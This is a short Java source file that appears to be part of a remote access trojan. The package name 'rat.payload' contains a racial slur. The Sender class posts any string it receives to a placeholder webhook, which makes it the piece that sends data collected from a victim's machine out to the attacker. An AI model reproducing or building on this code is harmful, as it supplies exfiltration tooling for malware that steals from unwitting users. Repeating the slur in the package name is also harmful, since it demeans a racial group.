package me.nigger.rat.payload;

public final class Sender
{
    private static final Sender INSTANCE = new Sender();
    private final Queue<Object> queue = new ArrayDeque<>();

    private Sender()
    {

    }

    public static void send(Object string)
    {
        Webhook webhook = new Webhook("WEBHOOK HERE");
        webhook.setContent((String) string);
        try {
            webhook.execute();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
